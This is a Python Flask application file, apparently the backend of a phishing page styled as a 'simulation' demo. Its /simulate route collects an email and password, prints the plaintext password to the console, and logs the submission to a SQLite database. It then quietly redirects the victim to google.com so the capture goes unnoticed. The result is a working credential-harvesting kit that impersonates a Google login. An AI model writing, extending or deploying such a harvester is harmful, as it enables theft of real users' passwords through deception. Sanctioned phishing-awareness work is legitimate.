from datetime import datetime
import os
import sys

def init_db(base_dir):
    """Ensures the SQLite database and table structure exist."""
    import sqlite3
    db_path = os.path.join(base_dir, "demo_database.db")
    
    # Connects to the database file (creates it if it doesn't exist)
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Create the logging table structure
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            email TEXT NOT NULL,
            status TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

def log_to_db(base_dir, email, timestamp):
    """Inserts a submission record into the local SQLite file safely."""
    import sqlite3
    db_path = os.path.join(base_dir, "demo_database.db")
    
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Use parameterized queries (?) to prevent SQL Injection bugs!
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                email TEXT NOT NULL,
                status TEXT NOT NULL
            )
        ''')
 # Use parameterized queries (?) to prevent SQL Injection bugs!
        cursor.execute(
            "INSERT INTO submissions (timestamp, email, status) VALUES (?, ?, ?)",
            (timestamp, email, "PROCESSED_AND_REDIRECTED")
        )
        conn.commit()
        conn.close()
        print("[DATABASE] Submission successfully committed to demo_database.db")
    except Exception as e:
        print(f"[DATABASE ERROR] Failed to write to database: {e}")

def create_app():
    """Builds the Flask application with open terminal and database logging."""
    from flask import Flask, render_template, request, jsonify, redirect

    base_dir = os.path.dirname(os.path.abspath(__file__))
    app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))

    @app.get("/")
    def home():
        return render_template("index.html")

    @app.post("/simulate")
    def simulate():
        if request.is_json:
            data = request.get_json(silent=True) or {}
            email = str(data.get("email", "")).strip()
            password = str(data.get("password", ""))
        else:
            email = str(request.form.get("email", "")).strip()
            password = str(request.form.get("password", ""))

        if not email or not password:
            return jsonify(ok=False, message="Fields missing."), 400

        timestamp = datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
        
        # 1. Print the metric outputs to your screen as usual
        print(f"\n[{timestamp}] --- INCOMING DATA LOGGED ---")
        print(f"Received Email:    {email}")
        print(f"Received Password: {password}")
        print("-" * 40)

        # 2. **THE UPGRADE**: Write the submission data into your SQLite file
        log_to_db(base_dir, email, timestamp)

        # Seamless redirect line to the actual Google login portal
        return redirect("https://google.com")
        
    return app


def start_server():
    """Entry point for your global terminal shortcut command."""
    base_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(base_dir)

    venv_site_packages = os.path.join(base_dir, ".venv", "lib", "python3.14", "site-packages")
    if os.path.exists(venv_site_packages):
        sys.path.insert(0, venv_site_packages)
    
    # Initialize database files right before spinning up the application
    init_db(base_dir)
    
    app_instance = create_app()
    print("Launching Flask Web Server...")
    app_instance.run(host="127.0.0.1", port=5000, debug=False)

if __name__ == "__main__":
    start_server()

